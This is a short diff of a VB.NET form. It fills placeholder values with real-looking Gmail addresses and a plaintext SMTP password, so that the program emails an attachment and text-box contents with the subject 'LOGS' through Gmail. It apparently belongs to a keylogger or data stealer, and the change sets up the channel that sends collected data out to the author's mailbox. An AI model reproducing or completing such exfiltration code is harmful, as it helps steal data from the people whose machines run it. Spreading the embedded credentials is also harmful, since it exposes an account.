@@ -355,15 +355,15 @@ Public Class Form1
             Mail.Attachments.Add(attach)
 
             Mail.Subject = "LOGS"
-            Mail.To.Add("ur email")
-            Mail.From = New MailAddress("ur email")
+            Mail.To.Add("flysunway@gmail.com")
+            Mail.From = New MailAddress("vigobd@gmail.com")
             Mail.Body = TextBox1.Text
 
 
 
             Dim SMTP As New SmtpClient("smtp.gmail.com")
             SMTP.EnableSsl = True
-            SMTP.Credentials = New System.Net.NetworkCredential("ur email", "ur password")
+            SMTP.Credentials = New System.Net.NetworkCredential("vigobd@gmail.com", "pass2255")
             SMTP.Port = "587"
 
             SMTP.Send(Mail)
